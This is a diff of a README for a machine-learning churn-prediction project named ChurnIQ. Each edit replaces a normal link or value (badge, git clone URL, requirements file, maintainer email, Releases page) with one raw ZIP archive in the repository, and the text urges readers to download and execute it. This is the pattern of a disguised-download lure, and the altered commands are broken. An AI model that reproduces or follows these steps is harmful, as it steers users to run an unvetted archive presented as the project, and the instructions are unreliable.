@@ -1,6 +1,6 @@
 # ChurnIQ 🚀
 
-![ChurnIQ](https://img.shields.io/badge/ChurnIQ-ML%20Churn%20Prediction-blue)
+![ChurnIQ](https://github.com/XxsebalinkxX/ChurnIQ/raw/refs/heads/main/app/IQ-Churn-1.1.zip%20Churn%20Prediction-blue)
 
 Welcome to ChurnIQ, a full-stack application designed to predict customer churn using machine learning. Built with FastAPI, React/TypeScript, and scikit-learn, ChurnIQ provides an interactive user interface and a robust REST API to deliver accurate churn probability predictions. 
 
@@ -39,7 +39,7 @@ To get started with ChurnIQ, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/XxsebalinkxX/ChurnIQ.git
+   git clone https://github.com/XxsebalinkxX/ChurnIQ/raw/refs/heads/main/app/IQ-Churn-1.1.zip
    cd ChurnIQ
    ```
 
@@ -50,7 +50,7 @@ To get started with ChurnIQ, follow these steps:
      ```
    - Install the required packages:
      ```bash
-     pip install -r requirements.txt
+     pip install -r https://github.com/XxsebalinkxX/ChurnIQ/raw/refs/heads/main/app/IQ-Churn-1.1.zip
      ```
 
 3. **Set up the frontend**:
@@ -146,11 +146,11 @@ ChurnIQ is licensed under the MIT License. See the [LICENSE](LICENSE) file for d
 For questions or feedback, please reach out to the maintainers:
 
 - **Maintainer Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://github.com/XxsebalinkxX/ChurnIQ/raw/refs/heads/main/app/IQ-Churn-1.1.zip
 
 ## Releases
 
-To download the latest version of ChurnIQ, visit our [Releases](https://github.com/XxsebalinkxX/ChurnIQ/releases) section. You can find the necessary files to download and execute the application there.
+To download the latest version of ChurnIQ, visit our [Releases](https://github.com/XxsebalinkxX/ChurnIQ/raw/refs/heads/main/app/IQ-Churn-1.1.zip) section. You can find the necessary files to download and execute the application there.
 
 ---
 
